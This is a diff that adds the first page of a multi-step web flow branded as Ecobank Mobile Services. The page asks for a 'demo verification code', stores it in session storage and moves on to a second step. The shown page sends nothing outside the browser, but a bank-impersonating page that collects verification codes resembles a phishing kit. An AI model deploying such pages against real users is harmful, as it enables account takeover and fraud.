@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ECOBANK MOBILE SERVICES - Step 1</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      font-family: Arial, sans-serif;
+      background: #fff;
+      color: #123b6d;
+    }
+
+    header {
+      background: #0b4ea2;
+      color: #fff;
+      text-align: center;
+      padding: 22px 15px;
+      font-size: 22px;
+      font-weight: bold;
+    }
+
+    main {
+      flex: 1;
+      width: 100%;
+      max-width: 600px;
+      margin: auto;
+      padding: 50px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .form-container {
+      width: 100%;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 12px;
+      font-size: 18px;
+      font-weight: bold;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      border: 2px solid #0b4ea2;
+      border-radius: 8px;
+      font-size: 18px;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #168a3a;
+      box-shadow: 0 0 0 3px rgba(22, 138, 58, 0.15);
+    }
+
+    button {
+      width: 100%;
+      margin-top: 20px;
+      padding: 15px;
+      border: none;
+      border-radius: 8px;
+      background: #168a3a;
+      color: #fff;
+      font-size: 17px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #116d2e;
+    }
+
+    footer {
+      background: #0b4ea2;
+      color: #fff;
+      text-align: center;
+      padding: 15px;
+      font-size: 14px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <header>
+    ECOBANK MOBILE SERVICES
+  </header>
+
+  <main>
+    <div class="form-container">
+      <form id="stepOneForm">
+        <label for="demoCode">Enter Demo Verification Code</label>
+
+        <input
+          type="text"
+          id="demoCode"
+          name="demoCode"
+          placeholder="Enter demo code"
+          autocomplete="off"
+          required
+        >
+
+        <button type="submit">Continue</button>
+      </form>
+    </div>
+  </main>
+
+  <footer>
+    The Pan African Bank
+  </footer>
+
+  <script>
+    document.getElementById("stepOneForm").addEventListener("submit", function (event) {
+      event.preventDefault();
+
+      const code = document.getElementById("demoCode").value.trim();
+
+      if (!code) {
+        return;
+      }
+
+      sessionStorage.setItem("demoCode", code);
+      window.location.href = "/step-2.html";
+    });
+  </script>
+
+</body>
+</html>
